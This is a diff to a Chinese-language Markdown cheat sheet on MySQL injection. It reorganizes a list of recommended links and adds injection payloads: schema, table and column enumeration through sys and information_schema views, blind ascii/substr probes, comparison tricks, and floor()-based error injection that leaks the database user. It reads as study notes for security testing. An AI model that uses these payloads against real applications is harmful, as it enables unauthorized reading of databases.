@@ -1,5 +1,21 @@
 # MYSQL injection
 
+
+
+## 推荐网站
+
+ http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
+
+[http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/](http://p0desta.com/2018/03/29/SQL注入备忘录/)
+
+[https://ultramangaia.github.io/blog/2018/SQL%E6%B3%A8%E5%85%A5.html](https://ultramangaia.github.io/blog/2018/SQL注入.html)
+
+ https://security.yirendai.com/news/share/15 
+
+ https://xz.aliyun.com/t/7169# 
+
+
+
 ## 约束攻击
 
 我们先通过下列语句建立一个用户表
@@ -198,16 +214,7 @@ SELECT
 
 ### select xxoo into outfile '路径'：权限较高时可直接写文件
 
-## 推荐网站
- http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
 
-[http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/](http://p0desta.com/2018/03/29/SQL注入备忘录/)
-
-[https://ultramangaia.github.io/blog/2018/SQL%E6%B3%A8%E5%85%A5.html](https://ultramangaia.github.io/blog/2018/SQL注入.html)
-
- https://security.yirendai.com/news/share/15 
-
- https://xz.aliyun.com/t/7169# 
 
 ## 绕过
 
@@ -422,6 +429,10 @@ select * from flags where id='abcdd' union select 1,(select group_concat(b,e,f,g
 
 
 
+```
+(select 'admin','admin')>(select * from users limit 1)
+```
+
 
 
 
@@ -472,20 +483,33 @@ HANDLER tbl_name CLOSE
 
 ### 数据库名
 
-- SELECT database();
-- SELECT schema_name FROM information_schema.schemata;
+```
+SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
+SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
+SELECT database();
+SELECT schema_name FROM information_schema.schemata; 
+```
+
+
 
 ### 表名
 
-- union 查询
+```
+SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
+SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
+select 1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出当前数据库中的表 */
+AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)))>100
+```
 
-	- select 1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出当前数据库中的表 */
 
-- 盲注
-
-	- AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)))>100
 
 ### 列名
+
+```
+SELECT column_name FROM sys.schema_auto_increment_columns WHERE table_name='mspwd' GROUP BY column_name;
+```
+
+
 
 - union 查询
 
@@ -521,7 +545,7 @@ HANDLER tbl_name CLOSE
 
 - floor()
 
-	- select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+	- `select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`
 
 - extractvalue()
 
